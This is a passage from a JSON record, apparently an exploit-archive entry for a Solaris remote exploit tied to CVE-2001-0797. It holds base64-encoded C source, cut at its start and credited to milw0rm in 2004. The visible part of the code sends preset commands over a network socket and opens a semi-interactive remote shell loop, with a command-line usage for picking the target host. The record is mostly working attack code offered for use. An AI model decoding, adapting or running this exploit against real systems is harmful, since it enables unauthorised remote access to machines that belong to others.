CBmZCkNCnsNCglmZF9zZXQJZmRzOw0KCWNoYXIJdG1wWzEyOF07DQoJaW50CW47DQoNCgkvKiBxdW90ZSBIdmFyIDIwMDQgKi8NCglmcHJpbnRmKHN0ZGVyciwgIlwiRGEgQm9nIGRhIHRpIHNlIG1hbWljYSBuYWhpdGF2YWxhIHMgdnJhZ29tIHBvIGR2b3Jpc3R1IVwiIC0tIEJvemljYSAoSHJ2YXRza2EpXG5cbiIpOw0KDQoJLyogZXhlY3V0ZSBhdXRvIGNvbW1hbmRzICovDQoJd3JpdGUoMSwgIiMgIiwgMik7DQoJd3JpdGUoZmQsIENNRCwgc3RybGVuKENNRCkpOw0KDQoJLyogc2VtaS1pbnRlcmFjdGl2ZSBzaGVsbCAqLw0KCWZvciAoOzspIHsNCgkJRkRfWkVSTygmZmRzKTsNCgkJRkRfU0VUKGZkLCAmZmRzKTsNCgkJRkRfU0VUKDAsICZmZHMpOw0KDQoJCWlmIChzZWxlY3QoRkRfU0VUU0laRSwgJmZkcywgTlVMTCwgTlVMTCwgTlVMTCkgPCAwKSB7DQoJCQlwZXJyb3IoInNlbGVjdCIpOw0KCQkJYnJlYWs7DQoJCX0NCg0KCQkvKiByZWFkIGZyb20gZmQgYW5kIHdyaXRlIHRvIHN0ZG91dCAqLw0KCQlpZiAoRkRfSVNTRVQoZmQsICZmZHMpKSB7DQoJCQlpZiAoKG4gPSByZWFkKGZkLCB0bXAsIHNpemVvZih0bXApKSkgPCAwKSB7DQoJCQkJZnByaW50ZihzdGRlcnIsICJHb29kYnllLi4uXG4iKTsNCgkJCQlicmVhazsNCgkJCX0NCgkJCWlmICh3cml0ZSgxLCB0bXAsIG4pIDwgMCkgew0KCQkJCXBlcnJvcigid3JpdGUiKTsNCgkJCQlicmVhazsNCgkJCX0NCgkJfQ0KDQoJCS8qIHJlYWQgZnJvbSBzdGRpbiBhbmQgd3JpdGUgdG8gZmQgKi8NCgkJaWYgKEZEX0lTU0VUKDAsICZmZHMpKSB7DQoJCQlpZiAoKG4gPSByZWFkKDAsIHRtcCwgc2l6ZW9mKHRtcCkpKSA8IDApIHsNCgkJCQlwZXJyb3IoInJlYWQiKTsNCgkJCQlicmVhazsNCgkJCX0NCgkJCWlmICh3cml0ZShmZCwgdG1wLCBuKSA8IDApIHsNCgkJCQlwZXJyb3IoIndyaXRlIik7DQoJCQkJYnJlYWs7DQoJCQl9DQoJCX0NCgl9DQoNCgljbG9zZShmZCk7DQoJZXhpdCgxKTsNCn0NCg0Kdm9pZCB1c2FnZShjaGFyICpwcm9nbmFtZSkNCnsNCglmcHJpbnRmKHN0ZGVyciwgInVzYWdlOiAlcyBbLWggaG9zdF0gWy10IHRpbWVvdXRdIFstZF1cblxuIiwgcHJvZ25hbWUpOw0KCWZwcmludGYoc3RkZXJyLCAiLWggaG9zdFx0XHRkZXN0aW5hdGlvbiBpcCBvciBmcWRuXG4iKTsNCglmcHJpbnRmKHN0ZGVyciwgIi10IHRpbWVvdXRcdG5ldF9yZWFkKCkgdGltZW91dCAoZGVmYXVsdDogJWQpXG4iLCBUSU1FT1VUKTsNCglmcHJpbnRmKHN0ZGVyciwgIi1kXHRcdHR1cm4gb24gZGVidWcgbW9kZVxuXG4iKTsNCglleGl0KDEpOw0KfQ0KDQovLyBtaWx3MHJtLmNvbSBbMjAwNC0xMi0yNF0=", 
    "filename": "platforms/solaris/remote/716.c", 
    "id": "716", 
    "cves": [
        "CVE-2001-0797"
    ]
}